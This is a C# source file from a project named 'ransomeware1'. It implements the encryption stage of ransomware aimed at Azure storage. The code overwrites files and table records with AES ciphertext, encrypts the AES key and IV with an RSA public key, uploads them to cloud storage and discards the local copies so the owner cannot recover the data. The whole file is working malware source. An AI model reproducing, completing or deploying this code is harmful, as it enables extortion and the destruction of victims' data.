using System;
using System.IO;
using Microsoft.WindowsAzure.Storage;
using Microsoft.WindowsAzure.Storage.Blob;
using System.Security.Cryptography;

namespace ransomeware1
{
    public class AESEncryption
    {
        private AesCryptoServiceProvider myAes;

        public AESEncryption()
        {
            myAes = new AesCryptoServiceProvider();
        }

        public void EncryptAES(string filename, CloudStorageAccount storageAccount)
        {
            string plainText = File.ReadAllText(filename);

                // Check arguments.
            if (plainText == null || plainText.Length <= 0)
                throw new ArgumentNullException("plainText");
            byte[] encrypted;
            ICryptoTransform encryptor = myAes.CreateEncryptor(myAes.Key, myAes.IV);
            using (MemoryStream msEncrypt = new MemoryStream())
            {
                using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                {
                    using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
                    {
                        //Write all data to the stream.
                        swEncrypt.Write(plainText);
                    }
                    encrypted = msEncrypt.ToArray();
                    
                        File.WriteAllBytes(filename, encrypted);
                }
            }
        }

        public string TableEncryptAES(string record)
        {
            string plainText = record;

            // Check arguments.
            if (plainText == null || plainText.Length <= 0)
                throw new ArgumentNullException("plainText");
            byte[] encrypted;
            ICryptoTransform encryptor = myAes.CreateEncryptor(myAes.Key, myAes.IV);
            using (MemoryStream msEncrypt = new MemoryStream())
            {
                using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                {
                    using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
                    {
                        //Write all data to the stream.
                        swEncrypt.Write(plainText);
                    }
                    encrypted = msEncrypt.ToArray();

                    return System.Text.Encoding.UTF8.GetString(encrypted); 
                }
            }
        }

            public void OnFinishEncryption(CloudStorageAccount storageAccount, string publicKeyPath)
        {
            byte[] encryptedKey = Utils.RSAEncryptBytes(myAes.Key, publicKeyPath);
            byte[] encryptedIV = Utils.RSAEncryptBytes(myAes.IV, publicKeyPath);

            Utils.Upload(storageAccount, encryptedIV, "IV");
            Utils.Upload(storageAccount, encryptedKey, "key");
            
            //free byte[] memory
            encryptedIV = encryptedKey = null;
            GC.Collect(); //encryptedIV and encryptedKey are not accessable anymore :)
        }
        

    }
}
